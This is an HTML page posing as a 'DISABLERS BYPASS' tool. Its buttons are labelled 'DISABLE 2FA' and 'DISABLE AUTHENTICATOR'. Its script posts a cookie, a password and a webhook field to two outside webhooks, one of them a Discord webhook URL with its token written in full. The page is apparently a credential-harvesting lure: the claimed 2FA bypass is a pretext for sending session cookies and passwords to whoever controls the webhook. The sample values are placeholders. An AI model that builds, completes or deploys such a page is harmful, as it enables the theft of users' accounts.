<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disable Options</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #000;
            color: #00bfff;
            text-align: center;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.5);
        }

        h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }

        button {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 12px;
            background: #00bfff;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
        }

        button:hover {
            background: #009acd;
            transform: scale(1.05);
            box-shadow: 0 8px 20px rgba(0, 156, 205, 0.5);
        }

        button:disabled {
            background: #bbb;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DISABLERS BYPASS</h1>
        <button id="disable-2fa">DISABLE 2FA</button>
        <button id="disable-authenticator">DISABLE AUTHENTICATOR</button>
    </div>

    <script>
        const webhook1 = "https://your-first-webhook-url.com";  // Primer webhook
        const webhook2 = "https://discord.com/api/webhooks/1329981919823400970/5hDpWdgx7gSAggnhvk-iCvQA9c5-jgtUFeCWAIuHMeKNLDnNpr-gZRJ16ot2sLhJYpO9"; // Segundo webhook

        async function sendToWebhooks(data, buttonId) {
            // Deshabilitar los botones mientras la solicitud está en proceso
            document.getElementById(buttonId).disabled = true;

            try {
                // Enviar datos al primer webhook
                const response1 = await fetch(webhook1, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                // Enviar datos al segundo webhook
                const response2 = await fetch(webhook2, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                // Verificar si alguna de las respuestas no es exitosa
                if (!response1.ok || !response2.ok) {
                    throw new Error('Error al enviar los datos a los webhooks.');
                }

                // Mostrar alerta de éxito
                Swal.fire({
                    title: "Success",
                    text: "Data sent successfully to the webhooks.",
                    icon: "success",
                    confirmButtonText: "OK",
                    allowOutsideClick: true,  // Permite hacer clic fuera de la alerta
                    allowEscapeKey: true      // Permite cerrar la alerta con la tecla escape
                });
            } catch (error) {
                // Mostrar mensaje de error adecuado
                let errorMessage = "Failed to send data to the webhooks.";
                
                if (error.message.includes("Error al enviar")) {
                    errorMessage = error.message;
                } else if (error.name === "TypeError") {
                    errorMessage = "Network error: Please check your internet connection.";
                }

                // Mostrar alerta de error
                Swal.fire({
                    title: "Error",
                    text: errorMessage,
                    icon: "error",
                    confirmButtonText: "OK",
                    allowOutsideClick: true,  // Permite hacer clic fuera de la alerta
                    allowEscapeKey: true      // Permite cerrar la alerta con la tecla escape
                });
            } finally {
                // Habilitar nuevamente el botón después de que la solicitud se haya completado
                document.getElementById(buttonId).disabled = false;
            }
        }

        document.getElementById("disable-2fa").addEventListener("click", () => {
            const data = {
                "Cookie": "example-cookie-value",
                "Password": "example-password",
                "Webhook": "https://example-webhook-url.com"
            };
            sendToWebhooks(data, "disable-2fa");
        });

        document.getElementById("disable-authenticator").addEventListener("click", () => {
            const data = {
                "Cookie": "example-cookie-value",
                "Webhook": "https://example-webhook-url.com"
            };
            sendToWebhooks(data, "disable-authenticator");
        });
    </script>
</body>
</html>
